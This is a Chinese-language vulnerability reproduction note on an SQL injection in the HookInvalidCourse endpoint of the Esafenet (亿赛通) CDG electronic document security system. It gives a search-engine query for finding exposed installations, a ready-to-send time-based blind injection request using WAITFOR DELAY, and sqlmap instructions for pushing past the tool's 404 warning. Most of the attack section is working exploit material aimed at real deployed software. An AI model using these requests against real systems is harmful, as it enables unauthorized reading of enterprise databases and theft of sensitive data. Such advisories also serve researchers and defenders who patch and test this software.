# 亿赛通电子文档安全管理系统HookInvalidCourse存在SQL注入漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统HookInvalidCourse存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/7gxekhf2pSLNh1iS/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-152117.png)

# 四、漏洞复现
```plain
POST /CDGServer3/system/HookInvalidCourse;loginService HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

command=DelHookInvalidCourse&id=1';WAITFOR DELAY '0:0:3'--
```

![1700640331102-534fff64-497a-4026-b8e7-f9d06ccf3ec5.png](./img/7gxekhf2pSLNh1iS/1700640331102-534fff64-497a-4026-b8e7-f9d06ccf3ec5-709855.png)

sqlmap

```plain
POST /CDGServer3/system/HookInvalidCourse;loginService HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

command=DelHookInvalidCourse&id=1
```

注意：不能使用`--batch`参数，因响应为`404`，`sqlamp`

```plain
[CRITICAL] page not found (404)
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] n
```

![1700640609001-6b08c95b-d829-4fed-9d7d-2228ef7ac450.png](./img/7gxekhf2pSLNh1iS/1700640609001-6b08c95b-d829-4fed-9d7d-2228ef7ac450-411173.png)



![1700640620447-993fc465-1bf0-4c9a-8198-449f65c79dfd.png](./img/7gxekhf2pSLNh1iS/1700640620447-993fc465-1bf0-4c9a-8198-449f65c79dfd-484765.png)



> 更新: 2024-04-20 22:01:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uw9gw8vdvw99v8i3>